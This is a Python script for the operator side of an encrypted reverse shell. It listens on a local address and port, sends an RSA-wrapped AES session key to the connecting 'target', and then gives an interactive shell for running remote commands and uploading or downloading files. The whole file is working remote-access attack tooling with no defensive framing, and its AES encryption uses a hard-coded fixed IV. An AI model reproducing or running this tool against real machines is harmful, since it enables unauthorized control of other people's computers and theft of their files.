import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random
import os
import sys
from time import sleep
IV = b"H" * 16
# Randomly generate unique session key for this connection
key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 32))
# Send session key to target; encrypting it with targets public key
def SEND_AES(message):
    # Targets publicKey; needed to encrypt the session key to be sent to target
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2puYAHteyYvUCG9Jl2bv
GLF773uzVJPOMQ9EIRNvVaQ45tQV8sbxw1KR8FE66l5NH8jn2oYn7BZmO1Q+hwoA
lFtGI0kOYmR9l4A3IzSdttjmtQA8zGjNkTjj7dyufu2v77BsRNOSJTne3TIoL/Q/
T3LCVraHLVXO+YNEtKqdNpknJ6Lj2GSvsfr0WGy9hsOJq5/4hlGqjoiHhQOiO2CZ
fu0LJWOgLjv05JWb/R4Nu2DSGxdvcEvqW22W6IrjTQt5RW2Ng32cZu/44nUek8EU
aEyF7HBn5gmyVVDGyVOp2fQdI/1ZU4FM0aglzVE+T9ATP2RMdGMN9lbV+8yqL8n9
+KRXCoJeZhqbbw7vklYTlo33nmVXWlhnyxpf7E0Hmt2xaLqxTmtrxwmuwPb+J3h3
fuZZKLIdIcIFWSxa0x5DHn10to4fnOCP3mv9H4c2B99FpPShtTJbY4J1QKMygQzK
U4H4dm0Ybv3dPZJAinVjDv19lLSvLU+bXOpmRb06whs1hEMrxdRVhhfb3xPjiWjX
utXDt/4jc5wOJ/PMF02Lp8C/3L1Yboa7OZipxikL0btDJyl6F3yvJmR3c3SyKzCf
AmZ4xIclWkwhTDPHJpkYTPHlz7UYlfzA9jn76b/6EjLj6z95RmdY9JMUnMDLTNik
OH+1YoEcaCZE6iY19ePaqjECAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData
def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message
def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,16)
    return decrypted_message

def connect():
    def upload(filename):
        f = open(filename, 'rb')
        conn.send(f.read())
    
    def download(filename):
        f = open(filename, 'wb')
        conn.settimeout(1)
        chunk = conn.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = conn.recv(1024)
            except socket.timeout as e:
                break
        conn.settimeout(None)
        f.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.0.174', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connections on port 8080\n')
    conn, addr = s.accept()
    conn.send(SEND_AES(key.encode()))
    
    while True:
        command = input("[Shell]~ $ ")
        if 'nuke' in command:
            print('\n\t[!] Nuking connection\n')
            conn.send(encrypt(command.encode()))
            sleep(1.5)
            print('\t[!] Goodbye...\n')
            conn.close()
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            conn.send(encrypt(command.encode()))
        elif command[:6] == 'upload':
            conn.send(encrypt(command.encode()))
            print(f'\t[+] Transferring [{command[7:]}] ...')
            upload(command[7:])
            sleep(2.5)
        elif command[:8] == 'download':
            conn.send(encrypt(command.encode()))
            print(f'\n\t[!] Downloading file: {command[9:]}')
            download(command[9:])
            print(f'\t[!] {command[9:]} download complete\n')
        elif command == 'help':
            conn.send(encrypt(command.encode()))
            print('\n---HELP---\n')
            print('\t[+] upload <filename>: to upload a file to target machine')
            print('\t[+] download <filename>: to download file from the target machine')
            print('\t[+] more features to come\n')
        else:
            conn.send(encrypt(command.encode()))
            result = conn.recv(1024)
            print('\n'+decrypt(result).decode()+'\n')
            
connect()
